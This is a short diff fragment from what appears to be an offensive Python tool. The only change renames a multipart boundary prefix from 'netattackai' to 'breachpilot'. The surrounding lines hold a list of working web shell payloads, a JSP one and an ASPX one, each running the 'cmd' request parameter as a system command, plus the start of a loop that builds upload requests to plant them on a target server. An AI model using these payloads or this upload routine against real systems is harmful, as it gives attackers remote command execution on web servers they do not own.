@@ -237,7 +237,7 @@ shells = [
     ("shell.jsp", b"<% Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")); %>", "application/jsp"),
     ("shell.aspx", b"<%@ Page Language=\\"C#\\" %><% System.Diagnostics.Process.Start(\\"cmd.exe\\", \\"/c \\" + Request[\\"cmd\\"]); %>", "application/aspx"),
 ]
-boundary = "----netattackai" + uuid.uuid4().hex
+boundary = "----breachpilot" + uuid.uuid4().hex
 for filename, content, ctype in shells:
     try:
         body = (
